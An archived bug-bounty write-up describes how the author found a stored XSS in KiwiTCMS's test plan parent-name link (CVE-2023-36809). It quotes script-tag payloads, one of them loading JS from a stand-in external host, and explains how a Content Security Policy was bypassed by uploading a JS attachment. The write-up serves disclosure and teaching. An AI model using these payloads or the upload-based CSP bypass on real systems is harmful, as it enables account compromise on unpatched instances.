# Improper Neutralization of Input During Web Page Generation, Stored XSS in KiwiTCMS…

- **Source URL:** https://medium.com/@mahshooq/improper-neutralization-of-input-during-web-page-generation-stored-xss-in-kiwitcms-6d798f74d71?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20231012165922/https://medium.com/@mahshooq/improper-neutralization-of-input-during-web-page-generation-stored-xss-in-kiwitcms-6d798f74d71?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/3596 (id 3596)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Improper Neutralization of Input During Web Page Generation, Stored XSS in KiwiTCMS (CVE-2023–36809)

--

Hi everyone 👋🏻,

Today I would like to share a vulnerability I found in [**KiwiTCMS**](https://web.archive.org/web/20231012165922/https://github.com/kiwitcms/Kiwi), an open-source test management system for both manual and automated testing. Also, my first CVE ([**CVE-2023–36809**](https://web.archive.org/web/20231012165922/https://github.com/kiwitcms/Kiwi/security/advisories/GHSA-jpgw-2r9m-8qfw)).

[**CVE-2023–36809**](https://web.archive.org/web/20231012165922/https://github.com/kiwitcms/Kiwi/security/advisories/GHSA-jpgw-2r9m-8qfw) addresses two weaknesses in the Kiwi applications

[**CWE-434**](https://web.archive.org/web/20231012165922/https://cwe.mitre.org/data/definitions/434.html) (Unrestricted Upload of File with Dangerous Type) means the product allows the attacker to upload or transfer files of dangerous types that can be automatically processed within the product’s environment. which is found by another researcher called M Nadeem Qazi, for more (check his write up here: [https://medium.com/@mnqazi](https://web.archive.org/web/20231012165922/https://medium.com/@mnqazi/cve-2023-36809-misconfigured-http-headers-allowing-stored-xss-in-kiwitcms-12-4-by-m-nadeem-qazi-3aeea10f6103)). and [**CWE-79**](https://web.archive.org/web/20231012165922/https://cwe.mitre.org/data/definitions/79.html) (Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)) is what I found in the application.

Simply both weaknesses end up stored in XSS. So let’s start with how I found the bug.

[**KiwiTCMS**](https://web.archive.org/web/20231012165922/https://github.com/kiwitcms/Kiwi) has an option in the application called Test Plans; A Test Plan should identify which product features will be tested and what the overall test strategy is. (more: [https://kiwitcms.readthedocs.io/en/latest/guide/testplan.html#creating-testplan](https://web.archive.org/web/20231012165922/https://kiwitcms.readthedocs.io/en/latest/guide/testplan.html#creating-testplan) ),

Creating a test plan will require details like Name, product, version, parent id, etc. I initially made a few random test plans. To check how it works, after a few, I notice that when we create a new test plan, we can mention the parent id, which is a parent test plan for one test plan. Also, if we had a parent id in a test plan, it would appear as a reference link in the child test plan. As a herf link, the link uses its text as the test plan’s parent name.

So I just tried to create a parent with the Name *\<h1>hello\</h1>*. And mention this parent in the following child plan boom. It reflected and found an HTML injection.

Hehe, so easy, right? Since we found an **HTML injection**, I tried different XSS payloads on the parent plan name, but it’s not working as expected. Some were reflected as just text, and some were rendered blank. So then, I looked into the source code of the application. Since it’s a Django application and I am already familiar with Django, it is easy to find the vulnerable code in the application.

Let me provide you with an updated and rephrased explanation of the Django structure, along with the process you described in finding a reference link within the context of KiwiTCMS:

To comprehend the basic structure of Django, let’s delve into its components. A Django project embodies the entirety of the application, while apps represent distinct sections of the project, such as authentication and core functionalities. The division of the project into smaller apps is a matter of personal preference. The fundamental components of a specific app consist of **urls.py,** [**view.py**](https://web.archive.org/web/20231012165922/https://docs.djangoproject.com/en/4.2/topics/http/views/), and [**models.py**](https://web.archive.org/web/20231012165922/https://docs.djangoproject.com/en/4.2/topics/db/models/).

In the context of \`models.py,\` database classes are defined, given that Django employs [Object-Relational Mapping (ORM](https://web.archive.org/web/20231012165922/https://en.wikipedia.org/wiki/Object%E2%80%93relational_mapping)) as its default approach. *view.py* on the other hand, is responsible for determining application logic. It dictates how incoming requests are handled and what corresponding responses should be generated. As for *urls.py*, this file serves as the registry for app URLs. It establishes the linkage between URLs and the corresponding classes or functions within the view that manage the processing of these URLs.

Should you desire a more profound understanding, I recommend consulting the official Django documentation at [https://docs.djangoproject.com/en/4.2/.](https://web.archive.org/web/20231012165922/https://docs.djangoproject.com/en/4.2/.)

Now, shifting focus to our particular situation, the objective is to trace the origin of a reference link. Within the KiwiTCMS framework, a dedicated app labeled “test plan” plays a pivotal role. My approach involves examining the URLs housed within the test plan app, targeting those that align with the URL where the reference link materializes.

*source: https://github.com/kiwitcms/Kiwi/blob/v12.4/tcms/testplans/urls.py#L14-L18*

Upon scrutiny, I identified a pertinent view named \`TestPlanGetView.\` This view, classified as a \`DetailView\` in Django, specializes in rendering detailed information for a singular object associated with a model.

*source: https://github.com/kiwitcms/Kiwi/blob/v12.4/tcms/testplans/views.py#L127*

For a \`[**DetailView**](https://web.archive.org/web/20231012165922/https://docs.djangoproject.com/en/4.2/ref/class-based-views/generic-display/#detailview)\` to function effectively, two key attributes must be defined: the model under consideration and the template employed for rendering. The template used is “testplans/get.html,” and the model in question is \`TestPlan.\`

*source: https://github.com/kiwitcms/Kiwi/blob/v12.4/tcms/testplans/templates/testplans/get.html#L89*

Navigating to the template, I ascertained the mechanism behind creating the reference link within the HTML. It became evident that a function named \`***tree\_view\_html***\` extracted from the model, is invoked at this juncture.

*source: https://github.com/kiwitcms/Kiwi/blob/v12.4/tcms/testplans/models.py#L231*

Upon closer inspection of the \`***tree\_view\_html***\` function, it becomes apparent that a vulnerability exists. The vulnerable code can be traced to include the test plan’s Name directly from the database without undergoing input sanitization. This lapse in sanitization leads to the code being openly executed and displayed in the view, causing the issue.

Continuing where we left off, my exploration led me to investigate potential Cross-Site Scripting (XSS) vulnerabilities. With determined effort, I embarked on testing various XSS payloads. My objective was to uncover any weaknesses within the system’s defenses.

In one of my attempts, I employed a payload similar to *\<script src=” https://somehost.com/xss.js">\</script>*. However, my endeavor was met with a Content Security Policy (CSP) error.

CSP serves as a protective barrier against threats like cross-site scripting, clickjacking, and other forms of code injection that could arise from the execution of malicious content originating from an untrusted source. In this instance, the error indicated that the browser was rigorously enforcing security policies to prevent the inclusion of external scripts.

Undeterred, I turned my attention to understanding the source of the vulnerability within the same application’s context. That thought led me to experiment with the attachment feature within the test plan functionality. This feature allowed users to upload files pertinent to the tests being conducted.

I utilized the application’s file upload feature to upload a js file with an XSS payload. I called my previous payload ***\<script src=”path/to/uploaded/file.js”>\</script>***, and it worked the XSS, and the sequence effectively triggered the XSS vulnerability within the reference link.

And that is how I got my first CVE.

Thank you for taking the time to read about my exploration of vulnerabilities in KiwiTCMS. Your interest is greatly appreciated.

I will love to hear from you if you have any feedback or thoughts. Your insights are valuable in helping me improve and refine my work.

Once again, thank you for your time and attention

**Bye, Happy Hacking..!**

- Report: [https://huntr.dev/bounties/c6eeb346-fa99-4d41-bc40-b68f8d689223/](https://web.archive.org/web/20231012165922/https://huntr.dev/bounties/c6eeb346-fa99-4d41-bc40-b68f8d689223/)
- GitHub Security Advisories: [https://github.com/kiwitcms/Kiwi/security/advisories/GHSA-jpgw-2r9m-8qfw](https://web.archive.org/web/20231012165922/https://github.com/kiwitcms/Kiwi/security/advisories/GHSA-jpgw-2r9m-8qfw)
- CVE: [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-36809](https://web.archive.org/web/20231012165922/https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-36809)

Feel free to connect with me:
